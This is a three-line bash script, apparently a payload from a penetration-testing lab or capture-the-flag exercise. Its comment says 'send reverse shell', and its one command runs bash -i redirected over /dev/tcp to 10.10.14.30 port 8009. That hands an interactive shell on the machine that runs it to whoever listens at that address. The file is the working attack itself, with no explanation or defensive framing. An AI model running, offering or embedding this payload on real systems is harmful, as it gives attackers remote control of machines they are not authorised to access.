#! /bin/bash
#send reverse shell 
bash -i >& /dev/tcp/10.10.14.30/8009 0>&1

